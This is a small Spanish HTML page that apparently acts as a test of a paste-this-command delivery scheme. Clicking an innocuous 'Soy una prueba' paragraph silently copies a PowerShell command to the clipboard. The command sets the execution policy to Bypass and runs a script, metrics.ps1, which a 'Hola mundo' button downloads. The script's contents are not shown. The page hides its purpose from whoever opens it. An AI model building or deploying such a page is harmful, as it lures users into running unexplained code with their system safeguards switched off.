<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Inicio</title>
</head>
<body>

    <p id="cmd" style="cursor: pointer;">Soy una prueba</p>
    <script>
        document.getElementById('cmd').addEventListener('click', function() {
            const cmd = 'cd "$HOME\\Desktop"; Set-ExecutionPolicy Restricted -Scope CurrentUser; Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; .\\metrics.ps1';
            navigator.clipboard.writeText(cmd);
        });
    </script>

    <a href="metrics.ps1" download="metrics.ps1">
        <button>Hola mundo</button>
    </a>

</body>
</html>
